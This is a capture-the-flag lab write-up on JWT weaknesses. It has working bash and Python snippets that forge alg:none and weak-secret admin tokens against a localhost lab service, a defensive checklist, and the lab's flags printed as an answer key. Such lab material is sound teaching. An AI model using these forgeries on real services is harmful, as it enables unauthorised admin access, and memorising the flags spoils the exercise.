# DEBRIEF: Cookie Monster

## Solutions

### Flag 1: Decode the JWT
```bash
# Get a token
TOKEN=$(curl -s http://localhost:7332/login?user=guest | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

# Split at dots and decode each part
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null  # Header
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null  # Payload
```

The payload contains:
```json
{"user": "guest", "role": "guest", "flag1": "FLAG{jwt_payload_is_just_base64_anyone_can_read_it}"}
```

**FLAG{jwt_payload_is_just_base64_anyone_can_read_it}**

### Flag 2: Algorithm "none" Attack
```bash
# Create a forged JWT with algorithm "none"
# Header: {"alg": "none", "typ": "JWT"}
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')

# Payload: change role to admin
PAYLOAD=$(echo -n '{"user":"guest","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_')

# No signature needed with alg:none — just add a trailing dot
FORGED="${HEADER}.${PAYLOAD}."

echo "Forged token: $FORGED"
```

**FLAG{algorithm_none_attack_bypasses_signature_verification}**

### Flag 3: Access Admin Dashboard
```bash
curl -H "Authorization: Bearer ${FORGED}" http://localhost:7332/admin
```

**FLAG{never_trust_client_side_role_claims_without_server_validation}**

### Alternative: Weak Secret Attack
```python
#!/usr/bin/env python3
"""Sign with the weak secret 'secret'"""
import hmac, hashlib, base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"user": "admin", "role": "admin"}).encode())
sig = hmac.new(b"secret", f"{header}.{payload}".encode(), hashlib.sha256).digest()
token = f"{header}.{payload}.{b64url(sig)}"
print(token)
```

## Mental Model

```
JWT (JSON Web Token) Structure:
  header.payload.signature
  
  HEADER (tells server HOW to verify):
  {"alg": "HS256", "typ": "JWT"}
  
  PAYLOAD (the actual claims/data):
  {"user": "alice", "role": "admin", "exp": 1699999999}
  
  SIGNATURE (integrity check):
  HMAC-SHA256(header.payload, secret_key)

JWT Vulnerabilities:
├── alg:none attack (CVE-2015-2951)
│   └── Set algorithm to "none", remove signature → server skips verification
├── Weak secret keys
│   └── Brute-force common passwords: "secret", "password", company name
├── Algorithm confusion (RS256 → HS256)
│   └── Sign with the PUBLIC key as HMAC secret
├── No expiration (missing "exp" claim)
│   └── Token valid forever once issued
└── Client-side role trust
    └── Server trusts "role" from token without DB verification

SECURE JWT Checklist:
├── ALWAYS verify signature server-side
├── NEVER accept alg:none
├── Use strong random secrets (256+ bits)
├── Include AND verify "exp" (expiration)
├── Don't put sensitive data in payload (it's just base64!)
├── Use asymmetric keys (RS256) for distributed systems
└── Validate claims against database (don't trust token roles blindly)
```

## Real-World Impact
- CVE-2015-2951: Auth0, jwt-simple, and many libraries accepted alg:none
- Forcepoint VPN: JWT bypass gave admin access
- Many apps put PII in JWT payload (visible to anyone who copies the token)

## Skills Unlocked
- JWT structure and decoding
- Base64URL encoding/decoding
- Token forgery with algorithm manipulation
- curl with Authorization headers
- Understanding auth token lifecycle
- HMAC signing mechanics
